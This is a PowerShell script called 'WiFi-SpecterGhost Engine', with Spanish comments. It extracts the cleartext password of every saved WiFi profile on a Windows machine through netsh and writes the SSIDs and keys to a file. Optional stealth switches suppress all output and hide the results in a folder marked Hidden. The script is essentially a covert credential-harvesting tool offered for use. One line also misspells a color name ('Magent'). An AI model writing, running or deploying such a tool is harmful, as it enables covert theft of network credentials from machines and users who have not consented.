# --- WiFi-SpecterGhost Engine ---
# Este script es el corazón del proyecto. No lo borres, fiera.

param (
    [switch]$Silent = $false,
    [switch]$UseHiddenFolder = $false,
    [string]$OutputName = "wpsd.txt",
    [string]$FolderName = "invisible"
)

$scriptDirectory = $PSScriptRoot
$outputFilePath = Join-Path -Path $scriptDirectory -ChildPath $OutputName
$outputFolderPath = Join-Path -Path $scriptDirectory -ChildPath $FolderName

# Limpiar si ya existe en la raíz
if (Test-Path $outputFilePath) {
    Remove-Item -Path $outputFilePath -Force -ErrorAction SilentlyContinue
}

if (-not $Silent) { Write-Host "Iniciando escaneo de redes guardadas..." -ForegroundColor Cyan }

# Obtener perfiles
$profilesOutput = (netsh wlan show profiles 2>$null)
$profileLines = $profilesOutput | Where-Object { $_ -match '^\s*(?:Perfil de todos los usuarios|All User Profile)\s*:\s*(.+)$' }

if (-not $profileLines) {
    if (-not $Silent) { Write-Host "No se encontraron perfiles guardados." -ForegroundColor Yellow }
} else {
    foreach ($line in $profileLines) {
        $profileName = ($line -split ':', 2)[1].Trim()
        $password = "[No encontrada]"

        try {
            $profileDetailOutput = (netsh wlan show profile name="$profileName" key=clear 2>$null)
            $keyLine = $profileDetailOutput | Where-Object { $_ -match '^\s*(?:Contenido de la clave|Key Content)\s*:\s*(.+)$' }

            if ($keyLine) {
                $password = ($keyLine -split ':', 2)[1].Trim()
            }
        } catch { continue }

        # Escribir al archivo
        try {
            "SSID: $profileName" | Add-Content -Path $outputFilePath
            "PWD: $password" | Add-Content -Path $outputFilePath
            "-----------------------------------------" | Add-Content -Path $outputFilePath
            if (-not $Silent) { Write-Host "Procesado: $profileName" -ForegroundColor Green }
        } catch { }
    }
}

# Manejo de carpeta oculta
if ($UseHiddenFolder -and (Test-Path $outputFilePath)) {
    try {
        if (-not (Test-Path -Path $outputFolderPath)) {
            New-Item -Path $outputFolderPath -ItemType Directory -Force | Out-Null
        }
        $folderItem = Get-Item -Path $outputFolderPath -Force
        $folderItem.Attributes = $folderItem.Attributes -bor [System.IO.FileAttributes]::Hidden
        
        Move-Item -Path $outputFilePath -Destination $outputFolderPath -Force
        if (-not $Silent) { Write-Host "Resultados movidos a carpeta oculta: $FolderName" -ForegroundColor Magent }
    } catch {
        if (-not $Silent) { Write-Error "Error al ocultar resultados." }
    }
}

if (-not $Silent) { Write-Host "¡Listo! El trabajo está hecho." -ForegroundColor Cyan }
